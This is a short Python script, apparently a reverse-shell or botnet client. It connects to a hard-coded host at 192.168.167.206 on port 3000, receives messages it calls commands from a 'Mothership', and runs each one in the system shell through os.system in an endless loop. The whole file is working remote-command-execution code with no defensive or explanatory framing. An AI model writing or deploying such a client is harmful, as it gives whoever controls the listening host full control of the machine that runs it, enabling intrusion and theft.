import socket
import time
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.167.206', 3000))

while True:
    msg = s.recv(1024)

    print('executing command from Mothership!: ' + msg.decode("utf-8"))
    time.sleep(1)
    os.system(msg)
